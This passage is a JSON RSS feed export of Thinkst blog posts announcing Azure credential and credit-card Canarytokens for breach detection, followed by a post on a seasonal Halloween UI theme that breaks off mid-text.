{
    "articles": [
        {
            "title": "Canarytokens.org welcomes Azure Login Certificate Token",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://blog.thinkst.com/feed",
                "value": "Canarytokens.org welcomes Azure Login Certificate Token"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://blog.thinkst.com/2023/02/canarytokens-org-welcomes-azure-login-certificate-token.html"
                }
            ],
            "link": "https://blog.thinkst.com/2023/02/canarytokens-org-welcomes-azure-login-certificate-token.html",
            "comments": "https://blog.thinkst.com/2023/02/canarytokens-org-welcomes-azure-login-certificate-token.html#respond",
            "authors": [
                {
                    "name": "Pieter"
                }
            ],
            "author": "Pieter",
            "author_detail": {
                "name": "Pieter"
            },
            "published": "Mon, 13 Feb 2023 16:24:55 +0000",
            "published_parsed": [
                2023,
                2,
                13,
                16,
                24,
                55,
                0,
                44,
                0
            ],
            "tags": [
                {
                    "term": "Uncategorized",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "azure",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "Canarytokens",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://blog.thinkst.com/?p=2369",
            "guidislink": false,
            "summary": "Introduction The AWS API key Canarytoken is a perennial favourite on Canarytokens.org, and we\u2019ve heard requests for a similar token for Azure. In this blog post, we introduce the Azure Login Certificate Token (aka the Azure Token) to Canarytokens.org1.&#160; As with all tokens, you can sprinkle Azure tokens throughout your environment and receive high fidelity notifications whenever they\u2019re used. Place one on your CTO\u2019s laptop, or on every server in your fleet. When attackers breach that laptop, or servers, or machine, they\u2019ll search for useful credentials and discover the Azure tokens. Such juicy credentials are too tempting to ignore, and when they try them, you\u2019ll be alerted to the compromise. Why is the Azure Login Certificate Token useful? Azure is second largest provider of cloud infrastructure services in the world. Hundreds of thousands of organizations use Azure Cloud to run their infrastructure. Thanks to the growing&#160;Infrastructure as Code movement,&#160;many of them are bound to use programmatic command line access to manage their infrastructure. Attackers know this too. Searching for Azure credentials is almost standard post-exploitation behaviour and finding login certificates are an attacker&#8217;s dream. This token turns that around. One alert, when it matters. Are Azure tokens just useful to [&#8230;]",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://blog.thinkst.com/feed",
                "value": "Introduction The AWS API key Canarytoken is a perennial favourite on Canarytokens.org, and we\u2019ve heard requests for a similar token for Azure. In this blog post, we introduce the Azure Login Certificate Token (aka the Azure Token) to Canarytokens.org1.&#160; As with all tokens, you can sprinkle Azure tokens throughout your environment and receive high fidelity notifications whenever they\u2019re used. Place one on your CTO\u2019s laptop, or on every server in your fleet. When attackers breach that laptop, or servers, or machine, they\u2019ll search for useful credentials and discover the Azure tokens. Such juicy credentials are too tempting to ignore, and when they try them, you\u2019ll be alerted to the compromise. Why is the Azure Login Certificate Token useful? Azure is second largest provider of cloud infrastructure services in the world. Hundreds of thousands of organizations use Azure Cloud to run their infrastructure. Thanks to the growing&#160;Infrastructure as Code movement,&#160;many of them are bound to use programmatic command line access to manage their infrastructure. Attackers know this too. Searching for Azure credentials is almost standard post-exploitation behaviour and finding login certificates are an attacker&#8217;s dream. This token turns that around. One alert, when it matters. Are Azure tokens just useful to [&#8230;]"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://blog.thinkst.com/feed",
                    "value": "<h1 class=\"wp-block-heading\">Introduction</h1>\n\n\n\n<p>The <a href=\"https://blog.thinkst.com/2017/09/canarytokens-new-member-aws-api-key.html\">AWS API key Canarytoken</a> is a perennial favourite on <a href=\"https://canarytokens.org\">Canarytokens.org</a>, and we\u2019ve heard requests for a similar token for Azure.</p>\n\n\n\n<p>In this blog post, we introduce the <strong>Azure Login Certificate Token</strong> (aka the Azure Token) to Canarytokens.org<sup>1</sup>.&nbsp;</p>\n\n\n\n<p>As with all tokens, you can sprinkle Azure tokens throughout your environment and receive high fidelity notifications whenever they\u2019re used. Place one on your CTO\u2019s laptop, or on every server in your fleet. When attackers breach that laptop, or servers, or machine, they\u2019ll search for useful credentials and discover the Azure tokens. Such juicy credentials are too tempting to ignore, and when they try them, you\u2019ll be alerted to the compromise.</p>\n\n\n\n<h1 class=\"wp-block-heading\">Why is the Azure Login Certificate Token useful?</h1>\n\n\n\n<p>Azure is <a href=\"https://www.statista.com/statistics/967365/worldwide-cloud-infrastructure-services-market-share-vendor/\">second largest provider of cloud infrastructure services</a> in the world. Hundreds of thousands of organizations use Azure Cloud to run their infrastructure. Thanks to the growing&nbsp;Infrastructure as Code movement,&nbsp;many of them are bound to use programmatic command line access to manage their infrastructure.</p>\n\n\n\n<p>Attackers know this too.</p>\n\n\n\n<p>Searching for Azure credentials is almost standard post-exploitation behaviour and finding login certificates are an attacker&#8217;s dream. This token turns that around. One alert, when it matters.</p>\n\n\n\n<p>Are Azure tokens just useful to Azure customers? Of course not; Canarytokens are useful across your actual vendor lines. You don\u2019t need to be an AWS customer to deploy actionable and useful AWS API Key Canarytokens, and nor do you need to be an Azure customer to find Azure tokens useful at detecting compromises in your network.</p>\n\n\n\n<p>Attackers who find them won\u2019t decide not to use them because they really don&#8217;t think you are an Azure shop. They will lick their chops while testing access (and in doing so will tip their hands).</p>\n\n\n\n<h1 class=\"wp-block-heading\">Creating Azure Login Certificate Token</h1>\n\n\n\n<p>It\u2019s dead simple: head over to <a href=\"https://canarytokens.org/generate\">canarytokens.org</a>, our public Canarytokens service:</p>\n\n\n\n<ol>\n<li>Select \u2018Azure Login Certificate\u2019 from the drop down list.</li>\n</ol>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-2388\" height=\"785\" src=\"https://i0.wp.com/blog.thinkst.com/wp-content/uploads/2023/02/4-TokenDataCompleted-1.png?resize=960%2C785&#038;ssl=1\" width=\"960\" /></figure></div>\n\n\n<ol start=\"2\">\n<li>Enter an email and a token reminder. We use the email address to notify you&nbsp;when the token is tripped. The reminder you choose will be attached to the alert. (Choose a unique reminder! Nothing sucks more than knowing a token is tripped, but being unsure where you left it). A good Reminder is something like \u201cAzure Token deployed to c:\\Users\\Administrator\\ on DC-LON-02\u201d, which clearly highlights where you placed it.</li>\n\n\n\n<li>Click on \u201cCreate my Canarytoken\u201d:</li>\n</ol>\n\n\n\n<figure class=\"wp-block-image size-full\"><img alt=\"\" class=\"wp-image-2404\" height=\"495\" src=\"https://i0.wp.com/blog.thinkst.com/wp-content/uploads/2023/02/image-1.png?resize=809%2C495&#038;ssl=1\" width=\"809\" /></figure>\n\n\n\n<ol start=\"4\">\n<li>Congratulations, your new Azure token is ready to be deployed! The output displayed can either be copied into a new file in the place you want to deploy the token, or you can download a file and move it into place. Don\u2019t forget to delete an intermediate copies of the data.</li>\n</ol>\n\n\n\n<h1 class=\"wp-block-heading\">Testing the Azure token</h1>\n\n\n\n<p>On Linux (with the az tool installed), the token can be triggered simply by running:</p>\n\n\n\n<pre class=\"wp-block-code\"><code><code>$ az login --service-principal -u &lt;app-id&gt; -p &lt;password-or-cert&gt; --tenant &lt;tenant&gt;</code></code></pre>\n\n\n\n<p>with the relevant parameters updated using the information from the token. As an example:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-2390\" height=\"282\" src=\"https://i0.wp.com/blog.thinkst.com/wp-content/uploads/2023/02/7-TriggerToken_redacted-1.png?resize=960%2C282&#038;ssl=1\" width=\"960\" /></figure></div>\n\n\n<p>Within 5 to 10 minutes you\u2019ll get an alert notification indicating that the credentials have been used:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><img alt=\"\" class=\"wp-image-2405\" height=\"572\" src=\"https://i0.wp.com/blog.thinkst.com/wp-content/uploads/2023/02/image-2.png?resize=786%2C572&#038;ssl=1\" width=\"786\" /></figure>\n\n\n\n<h1 class=\"wp-block-heading\">Where to deploy the Azure Token</h1>\n\n\n\n<p>Place the Azure token config file alongside the certificate in a juicy place for potential attackers to find.</p>\n\n\n\n<p>Most systems have a <code>~/.azure</code> folder (much like the<code> ~/.aws</code> or <code>~/.ssh</code>) and you can place the config file and certificate there.</p>\n\n\n\n<h1 class=\"wp-block-heading\">Behind the scenes</h1>\n\n\n\n<p>The route followed is similar to what we do with AWS Key Canarytokens. In short, we pre-generate credentials programmatically into a pool of available credentials because each takes a few seconds to create. These are later allocated to a user when they request a new Azure Canarytoken. We then monitor the usage logs of the Azure accounts in which the credentials were created, and if credentials were used we send the alert.&nbsp;</p>\n\n\n\n<h1 class=\"wp-block-heading\">Wrapping up</h1>\n\n\n\n<p>The new Azure Canarytoken gives Azure customers (and everyone else) a simple new way to detect breaches, by deploying Azure credentials at no risk to themselves in places attackers would typically find them.&nbsp;</p>\n\n\n\n<p>Azure tokens are currently live on <a href=\"https://canarytokens.org\">Canarytokens.org</a>, and (as always) are completely free.</p>\n\n\n\n<p>They take just minutes to create and deploy (even if you are a slow typist). Try them. They are totally worth the time.</p>\n\n\n\n<h1 class=\"wp-block-heading\">Footnotes</h1>\n\n\n\n<p><sup>1</sup>Commercial customers <a href=\"https://help.canary.tools/hc/en-gb/articles/6990607916445-How-do-I-create-an-Azure-Login-Certificate-Canarytoken-\">have had this token for a little while now</a>.</p>"
                }
            ],
            "wfw_commentrss": "https://blog.thinkst.com/2023/02/canarytokens-org-welcomes-azure-login-certificate-token.html/feed",
            "slash_comments": "0",
            "post-id": "2369"
        },
        {
            "title": "Swipe right on our new credit card tokens!",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://blog.thinkst.com/feed",
                "value": "Swipe right on our new credit card tokens!"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://blog.thinkst.com/2023/01/swipe-right-on-our-new-credit-card-tokens.html"
                }
            ],
            "link": "https://blog.thinkst.com/2023/01/swipe-right-on-our-new-credit-card-tokens.html",
            "comments": "https://blog.thinkst.com/2023/01/swipe-right-on-our-new-credit-card-tokens.html#comments",
            "authors": [
                {
                    "name": "Jacob Torrey"
                }
            ],
            "author": "Jacob Torrey",
            "author_detail": {
                "name": "Jacob Torrey"
            },
            "published": "Sat, 21 Jan 2023 17:10:37 +0000",
            "published_parsed": [
                2023,
                1,
                21,
                17,
                10,
                37,
                5,
                21,
                0
            ],
            "tags": [
                {
                    "term": "Uncategorized",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://blog.thinkst.com/?p=2337",
            "guidislink": false,
            "summary": "Detect breaches with Canary credit cards! TL;DR; Today we\u2019re releasing a new Canarytoken type: actual credit cards!&#160; We recommend placing one anywhere you store payment information. If you ever get an alert on it, you know that that data-store has been compromised. Background Canaries generally aim to look like something an attacker would want to interact with. It&#8217;s why our mantra has always been that Canaries should look valuable (instead of just vulnerable). Historically, these have been network services, or a juicy repository of sensitive information that usually would encourage an attacker to advertise their presence as they move through the network attempting to find firm footholds. Canarytokens expand on that to include files or data that reliably trigger alerts when accessed.&#160; Our new credit card tokens fit this bill perfectly. We give you a perfectly valid credit card. You store it somewhere and if it&#8217;s ever used, we will let you know. Mix it in with your store of saved card data or on payment gateways. An attacker who plans to test the cards (as they normally do when obtaining them) or attackers who try to use them will immediately advertise their presence, and your response team can spring [&#8230;]",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://blog.thinkst.com/feed",
                "value": "Detect breaches with Canary credit cards! TL;DR; Today we\u2019re releasing a new Canarytoken type: actual credit cards!&#160; We recommend placing one anywhere you store payment information. If you ever get an alert on it, you know that that data-store has been compromised. Background Canaries generally aim to look like something an attacker would want to interact with. It&#8217;s why our mantra has always been that Canaries should look valuable (instead of just vulnerable). Historically, these have been network services, or a juicy repository of sensitive information that usually would encourage an attacker to advertise their presence as they move through the network attempting to find firm footholds. Canarytokens expand on that to include files or data that reliably trigger alerts when accessed.&#160; Our new credit card tokens fit this bill perfectly. We give you a perfectly valid credit card. You store it somewhere and if it&#8217;s ever used, we will let you know. Mix it in with your store of saved card data or on payment gateways. An attacker who plans to test the cards (as they normally do when obtaining them) or attackers who try to use them will immediately advertise their presence, and your response team can spring [&#8230;]"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://blog.thinkst.com/feed",
                    "value": "<h4 class=\"wp-block-heading\">Detect breaches with Canary credit cards!</h4>\n\n\n\n<p><strong>TL;DR;</strong></p>\n\n\n\n<p>Today we\u2019re releasing a new Canarytoken type: actual credit cards!&nbsp;</p>\n\n\n\n<ol>\n<li>Head over to <a href=\"https://canarytokens.org\">canarytokens.org</a>;</li>\n\n\n\n<li>We give you a valid credit card (number, expiration, and CVC);</li>\n\n\n\n<li>If anyone ever attempts to use that card you\u2019ll be notified.</li>\n</ol>\n\n\n\n<p>We recommend placing one anywhere you store payment information. If you ever get an alert on it, you know that that data-store has been compromised.</p>\n\n\n\n<h3 class=\"wp-block-heading\">Background</h3>\n\n\n\n<p>Canaries generally aim to look like something an attacker would want to interact with. It&#8217;s why our mantra has always been that Canaries should look valuable (instead of just vulnerable). Historically, these have been network services, or a juicy repository of sensitive information that usually would encourage an attacker to advertise their presence as they move through the network attempting to find firm footholds. Canarytokens expand on that to include files or data that reliably trigger alerts when accessed.&nbsp;</p>\n\n\n\n<p>Our new credit card tokens fit this bill perfectly. We give you a perfectly valid credit card. You store it somewhere and if it&#8217;s ever used, we will let you know.</p>\n\n\n\n<p>Mix it in with your store of saved card data or on payment gateways. An attacker who plans to test the cards (as they normally do when obtaining them) or attackers who try to use them will immediately advertise their presence, and your response team can spring into action.</p>\n\n\n\n<h3 class=\"wp-block-heading\">Using the token</h3>\n\n\n\n<p>Using this new token is easy, just head over to <a href=\"https://canarytokens.org/\">Canarytokens.org</a>, and select Credit Card token from the dropdown.</p>\n\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://lh3.googleusercontent.com/tqXf5kBPrSfAXQrbSavA6RgHAUSZo6hoIwXOYLHIu1yLY2BCxz3o0pjbfC7fChU0aalP2NGkkgp9HtfGIXtG_2458eOD_2-g-YuA4Qpggot9d4S7s-eONR3HNHglc5nIVS714GnZ00Hy7wrZshcL3jJKPC8fUAo5zd2LuAk_7iYHDN5THEpzha8bp9FKiA\" /></figure>\n\n\n\n<p>Then enter the email address or webhook URL where you want to be notified when an attempted transaction occurs (we never use this to spam you or sell you things, it\u2019s only to notify you when this card is used):</p>\n\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://lh3.googleusercontent.com/NHf-leWD7phU8hj0qPMfYpssxa0CTGbAWuc5eqrTZuqwKwi8LJdUSKYsxzc7bWFwNFkt-2OsGnK2-Y-jR4L5egB-i1Vq1LPTfyAU8CoQoHpwFCanQO1kl7dRggKl0uMGdbAKngw3rjOlU4nCsO4XA44KjJv8P5rtwZCZ3SDA023-HHUxFTzXADaY4jpOzA\" /></figure>\n\n\n\n<p>Hit \u201cCreate my Canarytoken\u201d, and after a few seconds we will give you a set of unique, valid (real) credit card information, complete with generated name, card number, expiration date, and CVC:</p>\n\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://lh5.googleusercontent.com/Chce3QcTD3WJCu30c_NsLRa5jBpVyaMF-H3Oo0tbeklP6-FOkj4k6kq3znUxeI9xUbl3D5YY6Ye0AirnNGJbd-Ip4iz_w4cdLQSKBaRyzNiRDrakPFAamCjUdY9AkBuNIo3KHv1q20v4bHRmTSiwkEBsb05Y3BvX59rVTllJiS7UKAkB9xuyr_EMGMQHsA\" /></figure>\n\n\n\n<p>You can also download this information as a CSV to programmatically import into your storage location.&nbsp;</p>\n\n\n\n<p>Some places we recommend putting these include:</p>\n\n\n\n<ol>\n<li>Databases where you store customer payment information</li>\n\n\n\n<li>Email inboxes (PSTs) to get an alert on email compromise</li>\n\n\n\n<li>If you\u2019re concerned about an insider, put one or two in a Word document on an internal file share in a file called something like: \u201ctravel payment info.docx\u201d</li>\n</ol>\n\n\n\n<p>Take a deep breath and relax, the hard work is all done!</p>\n\n\n\n<p>If someone does try to use the card, the transaction will fail, and you\u2019ll get an alert like this in your email with the merchant name, the amount of the transaction, and the note you put in when you created the account:</p>\n\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://lh4.googleusercontent.com/JsJUup4xJnndnUOSW0FVe2Fqa7V2aaGC7fmEcWS9EhBg3E3Mwe21DsGqSJhU9-ScWVAqC7TzUi5T7O7frnISCaIMQN2t7bVXgylebTR9b7v8zSw4ika-YNXgcxKQKvAZqXqKTbtxxgm6Pmd8U0rB4prFKaKM4Y47VO2XpFKGJzz-BAm-Y9m-RTldlZkK7w\" /></figure>\n\n\n\n<p>This is a high quality alert\u2013someone is actively trying to monetize data that they should only have been able to get from wherever you put this token. Like all other well deployed Canarytokens, it also self identifies. You can drop one in each payment store or database and forget about it (at least until the card expires). When you get the alert, you will know immediately that it&#8217;s the credit card from the Lisbon DB that was used, and you know immediately where to start investigating.</p>\n\n\n\n<p>The chances of a false positive for this alert is close to nil and historically it&#8217;s been clear that the quicker you are able to react to the compromise, the more you are able to contain the splash damage of the event.</p>\n\n\n\n<h3 class=\"wp-block-heading\">Conspicuous deception</h3>\n\n\n\n<p>Canaries and Canarytokens have caught red-teamers, fast-fingered insiders and full-blown attackers all over the world. We expected them to when we started Canary. What we didn\u2019t quite expect, was the deterrence factor once attackers became aware of their presence. Last year, during an external red-team engagement, we placed attackers on a presentation laptop in our conference-room. The attackers, knowing our proclivities, were afraid to move beyond that system, paralyzed (almost into inaction) for days. This matches feedback we\u2019ve received both privately and publicly for years:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter\"><a href=\"https://twitter.com/infosec_au/status/949014188579610624?s=20&amp;t=uzizOYeWdmjLf3XZRR6MhA\"><img alt=\"\" src=\"https://lh3.googleusercontent.com/9HwufV0b7KFrfHNg4J_xCgL6-Zvw9JDALvB6A0_p-aa0Iuffq5thXk2XcTFxnhWMwvuvGWn_i93TS1Z2ADeIPz5GXLLUhnqmz4QV2DzEzDdwu5MJfILigm-hi_MUzGXeT9csNuimGs47AgcYshDW5cgYX-Edp9hDkrueG-CV2-9IAvhv1QyfPOABVy4erQ\" /></a></figure></div>\n\n\n<p>We\u2019ve been noodling on this a little bit and we\u2019re calling it <em>conspicuous deception. </em>Letting people know you are running Canaries or Canarytokens in order to alter their behavior.</p>\n\n\n\n<p>We think the credit card Canarytoken is a good example of this.</p>\n\n\n\n<p>If this token has the impact that we hope, savvy attackers, or the buyers of their stolen dumps, will have to start considering the risk of a test swipe destroying the entire set. As merchants and their payment processors leverage this new visibility, they can respond to a test swipe event much more quickly, and with better understanding of the potential splash damage of a breach. Typically credit card companies and banks identify breaches through analysing multiple reports of fraud looking for commonalities in their transactions (such as physical charge locations, websites where the card was used, or payment processors that were involved). This takes time for sufficient fraud reports to flow in before the breached location can be identified. This token allows for near instantaneous identification of a breach.</p>\n\n\n\n<p>For low-tier attackers that continue to breach and steal cards without changing their tactics, this token will reduce their ability to monetize and commit fraud. Savvy attackers may start looking for patterns in the bank identification numbers (BINs) that we issue, and proactively deleting or excluding them from their dumps. For this reason we are in discussions with a number of banks to onboard their BINs to the system too, further mixing in legitimate cards with tokens.&nbsp;</p>\n\n\n\n<p>It\u2019s a compelling argument: \u201cWould you like attackers to first remove your bank\u2019s cards from dumps they steal?\u201d&nbsp;</p>\n\n\n\n<p>The more BINs we can cover with tokens, the more deterrence the token provides \u2013 even to organizations that have not deployed these tokens to their environment. This is a benefit of conspicuous deception, the <em>possibility </em>of the dump being tripwired provides protection even if it isn\u2019t actually seeded with tripwires.</p>\n\n\n\n<h3 class=\"wp-block-heading\">Conclusions</h3>\n\n\n\n<p>Canaries and Canarytokens are powerful tools that are easily deployed. Recently a security researcher, Daniel H\u00fcckman discovered his AWS Canarytokens stored in his CircleCI environment being improperly used.&nbsp;</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter\"><img alt=\"\" src=\"https://lh4.googleusercontent.com/vJlbllXWkpbIVjTJNnF_p5WJBP-hG8lm2bGg1Xn7ko-xRmHktUNYcVS-36f9HdBczxJ3UlVzOc2hJl7XQWT0PQK1zJsy2L8fvmPk8o-3S5wUXooEepm4dWVTJHqYNTCuzCjLHEQRukALEqvnAb1RkGeQ0KKvc-mZbT8dn8ecsuJtjWcNIb5DYZAWEoQF9w\" /></figure></div>\n\n\n<p>The credit card Canarytoken provides more ways to monitor your environment, as well as the exposure to your data by third parties. Credit card fraud amounts to almost $40B per year worldwide, we hope that with faster response times to a breach to help make a [small] dent in that figure.</p>\n\n\n\n<p>We think that our Canarytokens offer great protection and detection capabilities while being easy to deploy, and cost-effective (free!). By giving them away for free, we introduce a risk for attackers who are trying to monetize their access, from AWS credentials that may provide access to the crown jewels to an Excel document called \u201c2022 Taxes\u201d&#8211;attackers need to step a little more carefully.&nbsp;</p>\n\n\n\n<p>We hope you\u2019re as excited about this new token as we are (and that it never has to alert you).<br />Ps. if you are a bank/card-issuer that wants to work with us to help protect your customers too please drop us a note at <a href=\"mailto:research@thinkst.com\">research@thinkst.com</a></p>"
                }
            ],
            "wfw_commentrss": "https://blog.thinkst.com/2023/01/swipe-right-on-our-new-credit-card-tokens.html/feed",
            "slash_comments": "1",
            "post-id": "2337"
        },
        {
            "title": "Seasonal themes, delighting users & small UX touches",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://blog.thinkst.com/feed",
                "value": "Seasonal themes, delighting users & small UX touches"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://blog.thinkst.com/2022/11/seasonal-themes-delighting-users-small-ux-touches.html"
                }
            ],
            "link": "https://blog.thinkst.com/2022/11/seasonal-themes-delighting-users-small-ux-touches.html",
            "comments": "https://blog.thinkst.com/2022/11/seasonal-themes-delighting-users-small-ux-touches.html#respond",
            "authors": [
                {
                    "name": "haroon meer"
                }
            ],
            "author": "haroon meer",
            "author_detail": {
                "name": "haroon meer"
            },
            "published": "Wed, 30 Nov 2022 10:08:30 +0000",
            "published_parsed": [
                2022,
                11,
                30,
                10,
                8,
                30,
                2,
                334,
                0
            ],
            "tags": [
                {
                    "term": "Uncategorized",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://blog.thinkst.com/?p=2243",
            "guidislink": false,
            "summary": "We\u2019ve written before about the effort we put into UX choices in our app. We don\u2019t consider problems solved just because we kicked out a feature in its general vicinity and we are super strong believers in \u201csmall things done well\u201d This came to the fore again recently when we included a \u201cseasonal theme\u201d into customer Consoles and I figured it was worth a brief post to examine our thinking around (even) short-term UX. In our early days we\u2019d give a brief nod to seasonal changes by slightly altering our Twitter avatar. Having an actual legit designer on the team gives us significantly more leeway, and so \u201cConsole Seasonal Themes&#8221; was born. The plan is to (very infrequently) add small non-obtrusive splashes within the customer Console when a reasonable opportunity arises. These splashes should be subtle and hopefully bring a quick smile to someone&#8217;s face as they go about their day. Halloween was the first opportunity to take it for a spin, and Blake threw up a few concepts. We wanted to make sure that the theme never came close to interfering with anyones workflows so ended up with two main areas to decorate: the Console header, and the Canary [&#8230;]",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://blog.thinkst.com/feed",
                "value": "We\u2019ve written before about the effort we put into UX choices in our app. We don\u2019t consider problems solved just because we kicked out a feature in its general vicinity and we are super strong believers in \u201csmall things done well\u201d This came to the fore again recently when we included a \u201cseasonal theme\u201d into customer Consoles and I figured it was worth a brief post to examine our thinking around (even) short-term UX. In our early days we\u2019d give a brief nod to seasonal changes by slightly altering our Twitter avatar. Having an actual legit designer on the team gives us significantly more leeway, and so \u201cConsole Seasonal Themes&#8221; was born. The plan is to (very infrequently) add small non-obtrusive splashes within the customer Console when a reasonable opportunity arises. These splashes should be subtle and hopefully bring a quick smile to someone&#8217;s face as they go about their day. Halloween was the first opportunity to take it for a spin, and Blake threw up a few concepts. We wanted to make sure that the theme never came close to interfering with anyones workflows so ended up with two main areas to decorate: the Console header, and the Canary [&#8230;]"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://blog.thinkst.com/feed",
                    "value": "<p>We\u2019ve written before about the effort we put into UX choices in our app. We don\u2019t <a href=\"https://blog.thinkst.com/2020/11/new-features-arent-solved-problems.html\" rel=\"noreferrer noopener\" target=\"_blank\">consider problems solved</a> just because we kicked out a feature in its general vicinity and we are super strong believers in \u201c<a href=\"https://blog.thinkst.com/2020/10/small-things-done-well.html\" rel=\"noreferrer noopener\" target=\"_blank\">small things done well</a>\u201d</p>\n\n\n\n<p>This came to the fore again recently when we included a \u201cseasonal theme\u201d into customer Consoles and I figured it was worth a brief post to examine our thinking around (even) short-term UX.</p>\n\n\n\n<p>In our early days we\u2019d give a brief nod to seasonal changes by slightly altering our Twitter avatar.</p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img alt=\"\" class=\"wp-image-2247\" height=\"452\" src=\"https://i0.wp.com/blog.thinkst.com/wp-content/uploads/2022/11/avatars.jpg?resize=700%2C452&#038;ssl=1\" width=\"700\" /></figure>\n\n\n\n<p>Having an actual legit designer on the team gives us significantly more leeway, and so \u201cConsole Seasonal Themes&#8221; was born. The plan is to (very infrequently) add small non-obtrusive splashes within the customer Console when a reasonable opportunity arises. These splashes should be subtle and hopefully bring a quick smile to someone&#8217;s face as they go about their day.</p>\n\n\n\n<p>Halloween was the first opportunity to take it for a spin, and Blake threw up a few concepts. We wanted to make sure that the theme never came close to interfering with anyones workflows so ended up with two main areas to decorate: the Console header, and the Canary logo. He chose to animate ghostly birds in the header, and the logo got an appropriately spooky makeover.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img alt=\"\" class=\"wp-image-2250\" height=\"100\" src=\"https://i0.wp.com/blog.thinkst.com/wp-content/uploads/2022/11/header.gif?resize=960%2C100&#038;ssl=1\" width=\"960\" /></figure>\n\n\n\n<p>It was beautiful but before unleashing it on all customer Consoles, Nick felt strongly that we should also include a button to disable the animation/effect.</p>\n\n\n\n<p>We know how some customers prefer to even disable minor window animations in the UI so it was the right call. I was originally ok with simply feature-flagging the effect, which would allow the CS/support teams to disable it if a user complained, but Nick correctly pointed out that this was making the customer do too much to switch off something they never asked for.</p>\n\n\n\n<p>So he added a toggle under settings to disable the animation:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img alt=\"\" class=\"wp-image-2253\" height=\"472\" src=\"https://i0.wp.com/blog.thinkst.com/wp-content/uploads/2022/11/season-toggle.gif?resize=960%2C472&#038;ssl=1\" width=\"960\" /></figure>\n\n\n\n<p>This seems like a reasonable place to ship it, but there is still a flaw: how does a user who signs in know that the animation can be turned off in settings? If they don\u2019t know the toggle is there, it might as well not be.</p>\n\n\n\n<p>So the team next tried adding a small unobtrusive button on the actual header.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img alt=\"\" class=\"wp-image-2256\" height=\"270\" src=\"https://i0.wp.com/blog.thinkst.com/wp-content/uploads/2022/11/banner-button.gif?resize=960%2C270&#038;ssl=1\" width=\"960\" /></figure>\n\n\n\n<p>The generic <img alt=\"\u2139\" class=\"wp-smiley\" src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/2139.png\" style=\"height: 1em;\" /> button looked like a candidate for replacement. We went through a few quick variations and settled on a relatable jack-o\u2019-lantern:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-2258\" height=\"79\" src=\"https://i0.wp.com/blog.thinkst.com/wp-content/uploads/2022/11/icons.png?resize=179%2C79&#038;ssl=1\" width=\"179\" /></figure></div>\n\n\n<p>The button that only shows up as you approach the click-zone is a pattern we use elsewhere in the app to keep the interface clean while offering needed functionality but once more the problem would be: how does a user know they should go there to float up the button?</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><img alt=\"\" class=\"wp-image-2260\" height=\"584\" src=\"https://i0.wp.com/blog.thinkst.com/wp-content/uploads/2022/11/2022-11-29_21-04-49-1.gif?resize=800%2C584&#038;ssl=1\" width=\"800\" /></figure>\n\n\n\n<p>Instead of ever making the button completely disappear, we opted to use colour and a slight wiggle to bring the user\u2019s eye to it:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img alt=\"\" class=\"wp-image-2263\" height=\"173\" src=\"https://i0.wp.com/blog.thinkst.com/wp-content/uploads/2022/11/wiggle-jack.gif?resize=960%2C173&#038;ssl=1\" width=\"960\" /></figure>\n\n\n\n<p>At this point, one would be tempted once more to ship it, but if we are being completely honest, the current jack-o\u2019-button, even with its little wiggle could slip by as part of the animation. It isn\u2019t immediately obvious (unless you\u2019ve spent as much time as we have looking at it) that the lantern is actually a button.</p>\n\n\n\n<p>So what we wanted was a button that didn&#8217;t look like a button but that people would know was a button, and we wanted it to be well hidden enough but not too much. These kinds of seemingly opposing constraints aren\u2019t atypical in UX. Folks can think in terms of trade-offs or middle-ground, but with enough effort, we usually end up with a better result than just meeting-in-the-middle.</p>\n\n\n\n<p>The final form then was wiggling, colour-changing-jack, but with a quick flash when the page loads to let you know that something was under there. It didn&#8217;t matter if the text escaped too quickly, because your natural reaction would be to hover in the area (which could then activate the button).</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img alt=\"\" class=\"wp-image-2265\" height=\"173\" src=\"https://i0.wp.com/blog.thinkst.com/wp-content/uploads/2022/11/hover-jack.gif?resize=960%2C173&#038;ssl=1\" width=\"960\" /></figure>\n\n\n\n<p>Ultimately, it was worth it. We enjoyed making it happen and customers (at least some of them\u00b9) found it delightful!</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-2267\" height=\"293\" src=\"https://i0.wp.com/blog.thinkst.com/wp-content/uploads/2022/11/delight.png?resize=599%2C293&#038;ssl=1\" width=\"599\" 